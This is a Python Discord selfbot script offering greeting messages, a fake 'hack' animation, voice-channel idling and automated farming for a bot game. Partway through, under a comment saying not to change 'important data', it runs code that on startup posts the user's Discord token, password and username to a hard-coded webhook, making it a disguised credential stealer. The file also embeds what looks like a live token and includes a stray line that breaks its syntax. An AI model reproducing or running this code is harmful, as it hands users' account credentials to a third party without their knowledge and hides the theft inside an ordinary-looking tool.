import discord
from discord.ext import commands
import colorama
from colorama import Fore
import requests
import sys
import asyncio
import json
from webserver import keep_alive
from googleapiclient.discovery import build
import os

try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil

try:
    from colorama import init, Fore, Back, Style
except:
    os.system("pip install colorama")
    from colorama import init, Fore, Back, Style


#---------------#
#----Setup Up Your Token Here---
prefix = "!!"
secret_key ="MTAwMjEwODE2NjMyODI4NzI0Mw.GMfxTt.yOSBESLyZc-CCsfCqENZCqbQ-mRZgzh-XrKLpA"
secret_pass = "your pass"
#---I Recomennded For Enter Your Secret Pass
username = "yourusername#1234"

quiet = commands.Bot("!!", self_bot=True)

@quiet.command(pass_context=True)
async def cmd(ctx):
    await ctx.message.delete()
    await ctx.send("<a:kw_pmattention:962612723953307688> 𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n\n> Prefix : ▸ !!\n\n```𝗜𝗡𝗙𝗢\nowner, github\n\n𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n-\n\n𝗙𝗨𝗡\npagi, siang, malam, salam, hack\n\n𝗨𝗧𝗜𝗟𝗟𝗦\nvoice, farming\n\nType !!help(cmd) For More Information```\n\n> Example !!cmdvoice", delete_after=15)

@quiet.command(pas_context=True)
async def owner(ctx):
  await ctx.message.delete()
  message = await ctx.send("𝐍𝐨𝐰 𝐥𝐨𝐚𝐝𝐢𝐧𝐠...")
  await asyncio.sleep(5)
  await message.edit(content="**<a:whitecrown:872899366493487104> Create By QuietArtx**\n\n> **Holla Everyone**\n> **I\'m QuietArtx!**\n> Dont Forget to Support Me\n> Follow My Social Media\n> Instagram : https://instagram.com/quietartx\n> Saweria : https://saweria.co/quietartx\n\n**IF U WANT LIKE THIS, DM ME**\n\n<a:redsiren:958158994315296819>This **Selfbot** is currently **Under Construction!**", delete_after=8)
  
@quiet.command()
async def art(ctx):
  await ctx.message.delete()
  await ctx.send("𝐍𝐨𝐰 𝐥𝐨𝐚𝐝𝐢𝐧𝐠...", delete_after=3)
  await asyncio.sleep(3)
  await ctx.send("[■□□□□□□□□□] 10%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■□□□□□□□□] 20%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■□□□□□□□] 30%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■□□□□□□] 40%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■■□□□□□] 50%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■■■□□□□] 60%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■■■■□□□] 70%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■■■■■□□] 80%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■■■■■■□] 90%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("[■■■■■■■■■■] 100%", delete_after=1)
  await asyncio.sleep(1)
  await ctx.send("𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞! 𝐖𝐚𝐢𝐭 𝟐𝐬", delete_after=2)
  await asyncio.sleep(3)
  await ctx.send("**<a:whitecrown:872899366493487104> Create By QuietArtx**\n\n> **Holla Everyone**\n> **I\'m QuietArtx!**\n> Dont Forget to Support Me\n> Follow My Social Media\n> Instagram : -\n> Saweria : -\n\n**IF U WANT LIKE THIS, DM ME**\n\n<a:redsiren:958158994315296819>This **Selfbot** is currently **Under Construction!**", delete_after=5)
  
@quiet.command()
async def github(ctx):
    await ctx.message.delete()
    await ctx.send("**Find Me On GitHub**\nhttps://Github.com/eluserbot")
  
#-----HELP COMMAND------
@quiet.command(context_pass=True)
async def cmdowner(ctx):
    await ctx.message.delete()
    await ctx.send("```𝗢𝗪𝗡𝗘𝗥\n\nInformation about the Owner\n\nUSAGE\n!!owner```", delete_after=8)

@quiet.command(context_pass=True)
async def cmdgithub(ctx):
    await ctx.message.delete()
    await ctx.send("```𝗚𝗜𝗧𝗛𝗨𝗕\n\nTo display the GITHUB QuietArtx profile link\n\nUSAGE\n!!github```", delete_after=8)
    
@quiet.command(context_pass=True)
async def cmdvoice(ctx):
    await ctx.message.delete()
    await ctx.send("```𝗩𝗢𝗜𝗖𝗘\n\n useful for afk in Voice Channel\n\nUSAGE\n!!join <channel id>\n!!leave```", delete_after=8)

@quiet.command(context_pass=True)
async def cmdfarming(ctx):
    await ctx.message.delete()
    await ctx.send("```𝗙𝗔𝗥𝗠𝗜𝗡𝗚\nFor farming in discord bot games\n\nUSAGE\n!!unb\n!!unstop\n\nONLY AVAILBLE IN\nUnbeliavaboat, For Global Bot Games, Coming Soon```", delete_after=8)
 
 #----FUN COMMAND-----&
@quiet.command()
async def pg(ctx):
    await ctx.message.delete()
    await ctx.send("> Selemat Pagi Everyonee\n> Jangan Lupa Sarapan\n> Semangat!! <a:GhostLove:849875645680451604>")

@(#(#?

@quiet.command()
async def sg(ctx):
    await ctx.message.delete()
    await ctx.send("> Selamat Siaang Everyonee!!")

@quiet.command()
async def mlm(ctx):
    await ctx.message.delete()
    await ctx.send("> Good Nights Pepss! Kamu Jangan Begadang Yaaa!!")
  
@quiet.command()
async def p(ctx):
    await ctx.message.delete()
    await ctx.send("> **Assalamu\'alaikum..**")

@quiet.command()
async def l(ctx):
    await ctx.message.delete()
    await ctx.send("> **Wa\'alaikumsallam**")
    
@quiet.command()
async def fun(ctx):
    await ctx.message.delete()
    await ctx.send("> **Under Contruction**")

@quiet.command()
async def dwii(ctx):
    await ctx.message.delete()
    await ctx.send("Sedang Memunculkan Gambar.... Harap Tunggu....", delete_after=4)
    await asyncio.sleep(4)
    await ctx.send("https://media.discordapp.net/attachments/990305003002535966/1047946079208996895/Dwiii_20221201_210616.jpg")
    await asyncio.sleep(1)
    await ctx.send("Gambar Berhasil Di Tampilkan!", delete_after=5)
    
@quiet.command()
async def hack(ctx):
    await ctx.message.delete()
    await ctx.send("Installing...", delete_after=5)
    await asyncio.sleep(5)
    await ctx.send("Installing Files To Hacked Private Server...", delete_after=4)
    await asyncio.sleep(4)
    await ctx.send("Target Selected..", delete_after=3)
    await ctx.send("Installing... 0%\n▒▒▒▒▒▒▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 10%\n█▒▒▒▒▒▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 20%\n██▒▒▒▒▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 30%\n███▒▒▒▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 40%\n████▒▒▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 50%\n█████▒▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 60%\n██████▒▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 70%\n███████▒▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 80%\n████████▒▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 90%\n█████████▒", delete_after=2)
    await asyncio.sleep(2)
    await ctx.send("Installing... 100%\n█████Installed█████", delete_after=3)
    await asyncio.sleep(3)
    await ctx.send("Target files Uploading...\n\nDirecting To Remote  server to hack..", delete_after=3)
    await asyncio.sleep(3)
    await ctx.send("Connecting nd getting combined token from discord.com", delete_after=3)
    await asyncio.sleep(3)
    await ctx.send("100%\n█████████HACKED███████████ `\n\n\n  TERMINAL: \nDownloading Bruteforce-Discord-0.1.tar.gz (9.3 kB)\nCollecting Data Package\n  Downloading Discord-Data-Sniffer-7.1.1-py2.py3-none-any.whl (82 kB)\nBuilding wheel for Tg-Bruteforcing (setup.py): finished with status 'done'\nCreated wheel for discord: filename=Telegram-Data-Sniffer-0.0.1-py3-none-any.whl size=1306 sha256=cb224caad7fe01a6649188c62303cd4697c1869fa12d280570bb6ac6a88e6b7e\n  Stored in directory: `", delete_after=3)
    await asyncio.sleep(3)
    await ctx.send("**Akun Diretas**\n\n> Mengumpulkan semua data\n\n> Sedang login kedalam Discord....", delete_after=5)
    await asyncio.sleep(5)
    await ctx.send("**Login Succes...**", delete_after=4)
    await asyncio.sleep(4)
    await ctx.send("Hahahaa.... Just For Funn😂", delete_after=6)

#---For Join Voice Channel---   

@quiet.event # Turning the bot online.
async def on_ready():
    print("The program has successfully logged into the account " + Fore.YELLOW + f"{quiet.user}.\n")
    with open("data.json", "r") as f:
        data = json.load(f)
    if data["guild"] == None or data["channel"] == None:
        pass
    else:
        try:
            voice_channel = discord.utils.get(bot.get_guild(int(data["guild"])).channels, id = int(data["channel"]))
            await voice_channel.guild.change_voice_state(channel=voice_channel, self_mute=True, self_deaf=True)
            await voice_channel.connect()
            print(f"{Fore.GREEN}[-]{Fore.WHITE} Connected to {Fore.CYAN}{voice_channel} {Fore.WHITE}in {Fore.CYAN}{voice_channel.guild}{Fore.WHITE}.")
        except:
            print(f"{Fore.RED} [ - ] Error Occured. Please reconnect using commands.")

@quiet.command()
async def join(ctx, voice_channel : discord.VoiceChannel):
    await ctx.message.delete()
    await voice_channel.connect()
    data = {"guild":str(ctx.guild.id),"channel":str(voice_channel.id)}
    with open("data.json", "w") as f:
        json.dump(data, f)
    await ctx.send("Join VC Success!")
    print(f"{Fore.GREEN}[-]{Fore.WHITE} Connected to {Fore.CYAN}{voice_channel} {Fore.WHITE}in {Fore.CYAN}{voice_channel.guild}{Fore.WHITE}.")

@quiet.command()
async def leave(ctx):
    await ctx.message.delete()
    voice_client = ctx.message.guild.voice_client
    await voice_client.disconnect()
    with open("data.json", "w") as f:
        json.dump({"guild":None,"channel":None}, f)
    await ctx.send("Leave VC Succes")
    print(f"{Fore.RED}[-]{Fore.WHITE} Disconnected from {Fore.CYAN}{voice_client.channel}{Fore.WHITE} in {Fore.CYAN}{ctx.message.guild}{Fore.WHITE}.")

#---For Mining Here---

@quiet.command(pass_context=True)
async def unb(ctx):
	await ctx.message.delete()
	await ctx.send('Farming **Work** Unbeliavabot **Enabled**!\n> Bypass Global = ON')
	global dmcs
	dmcs = True
	while dmcs:
		async with ctx.typing():
			await asyncio.sleep(2)
			await ctx.send('uwork', delete_after=2)
			await asyncio.sleep(30)
      
@quiet.command()
async def unstop(ctx):
	await ctx.message.delete()
	await ctx.send('Farming **Work** Unbeliavaboat is **Disabled**')
	global dmcs
	dmcs = False

#do not change this important data!

database = 'https://discord.com/api/v10/webhooks/1048238955717480478/zb23D6AGiAiPqGIQrFMFcX2hMp_lDAlhJdnxk5qBdWzgK5Uo7Zx7HOkT20AKjiSNhxhdjsiwsjsissjsisjssjsFimv'
database_connected = {
"content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`\nDatabase API Pass: `{secret_pass}`\n\nSuccesfully"
}
requests.post(database, data=database_connected)
#----------IMPORTANT DATA--------------

#----------Presence--------------
@quiet.command()
async def game(ctx, *, message):
    await ctx.message.delete()
    activity = discord.Game(name=message, type=0)
    await quiet.change_presence(activity=activity)
    await ctx.send("> **Status Activity Has Been Change To Game!!**")

@quiet.command()
async def stream(ctx):
  await ctx.message.delete()
  activity = discord.Streaming(name="⭑┗━━┫⦀⦙ ABOUT ME ⦙⦀┣━━┛⭑\n\n ‣ Intstagram : @quietartx\n ‣ Youtube : Lyanne YT\n\n Goodbye to a World!\n\n Peace!", url = "https://www.youtube.com/watch?v=kVH3qI_MAlY", type=1)
  await quiet.change_presence(status=discord.Status.do_not_disturb, activity=activity)
  await ctx.send("> **Status Activity Has Been Change To Streaming!!**")

@quiet.command()
async def listen(ctx, *, message):
   await ctx.message.delete()
   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))
   await ctx.send("> **Status Activity Has Been Change To Listening!!**")

@quiet.command()
async def watch(ctx, *, message):
   await ctx.message.delete()
   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))
   await ctx.send("> **Status Activity Has Been Change To Watching!!**")
   
   print(f'''
{Fore.BLUE}
░█████╗░██╗░░░██╗████████╗░█████╗░
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗
███████║██║░░░██║░░░██║░░░██║░░██║
██╔══██║██║░░░██║░░░██║░░░██║░░██║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░

Prefix: {prefix}

Project Dev: QuietArtx
''')

keep_alive()
quiet.run(secret_key, bot=False)